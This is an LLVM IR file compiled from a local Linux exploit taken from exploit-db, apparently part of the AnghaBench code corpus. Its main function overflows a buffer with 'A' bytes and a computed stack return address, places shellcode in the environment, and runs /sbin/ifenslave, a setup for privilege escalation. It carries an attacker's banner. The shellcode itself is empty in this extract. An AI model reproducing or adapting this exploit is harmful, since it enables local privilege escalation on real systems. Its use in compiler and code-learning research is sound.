; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22644.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22644.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [16 x i8] c"/sbin/ifenslave\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"HOME=BLA\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [43 x i8] c"****************************************\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"hi,guys\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [55 x i8] c"Coded by jsk(&#38463;&#22372;&#65289;from ph4nt0m.net\0A\00", align 1
@.str.5 = private unnamed_addr constant [36 x i8] c"Welcome to http://www.ph4nt0m.net\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [44 x i8] c"****************************************\0A\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca [3 x i8*], align 16
  %5 = alloca [3 x i8*], align 16
  %6 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  %7 = load i32, i32* @BUFSIZE, align 4
  %8 = add nsw i32 %7, 10
  %9 = zext i32 %8 to i64
  %10 = call i8* @llvm.stacksave()
  store i8* %10, i8** %2, align 8
  %11 = alloca i8, i64 %9, align 16
  store i64 %9, i64* %3, align 8
  %12 = getelementptr inbounds [3 x i8*], [3 x i8*]* %4, i64 0, i64 0
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0), i8** %12, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 1
  store i8* %11, i8** %13, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 1
  store i8* null, i8** %14, align 8
  %15 = getelementptr inbounds [3 x i8*], [3 x i8*]* %5, i64 0, i64 0
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0), i8** %15, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** @shellcode, align 8
  store i8* %17, i8** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %16, i64 1
  store i8* null, i8** %18, align 8
  %19 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0))
  %20 = call i32 @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %21 = call i32 @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.4, i64 0, i64 0))
  %22 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.5, i64 0, i64 0))
  %23 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.6, i64 0, i64 0))
  %24 = getelementptr inbounds [3 x i8*], [3 x i8*]* %4, i64 0, i64 0
  %25 = load i8*, i8** %24, align 16
  %26 = call i32 @strlen(i8* %25)
  %27 = sext i32 %26 to i64
  %28 = sub i64 3221225464, %27
  %29 = load i8*, i8** @shellcode, align 8
  %30 = call i32 @strlen(i8* %29)
  %31 = sext i32 %30 to i64
  %32 = sub i64 %28, %31
  %33 = sub i64 %32, 2
  store i64 %33, i64* %6, align 8
  %34 = trunc i64 %9 to i32
  %35 = call i32 @memset(i8* %11, i32 65, i32 %34)
  %36 = load i32, i32* @BUFSIZE, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %11, i64 %37
  %39 = getelementptr inbounds i8, i8* %38, i64 4
  %40 = bitcast i64* %6 to i8*
  %41 = call i32 @memcpy(i8* %39, i8* %40, i32 4)
  %42 = load i32, i32* @BUFSIZE, align 4
  %43 = add nsw i32 %42, 8
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %11, i64 %44
  store i8 0, i8* %45, align 1
  %46 = getelementptr inbounds [3 x i8*], [3 x i8*]* %4, i64 0, i64 0
  %47 = load i8*, i8** %46, align 16
  %48 = getelementptr inbounds [3 x i8*], [3 x i8*]* %4, i64 0, i64 0
  %49 = getelementptr inbounds [3 x i8*], [3 x i8*]* %5, i64 0, i64 0
  %50 = call i32 @execve(i8* %47, i8** %48, i8** %49)
  store i32 0, i32* %1, align 4
  %51 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %51)
  %52 = load i32, i32* %1, align 4
  ret i32 %52
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
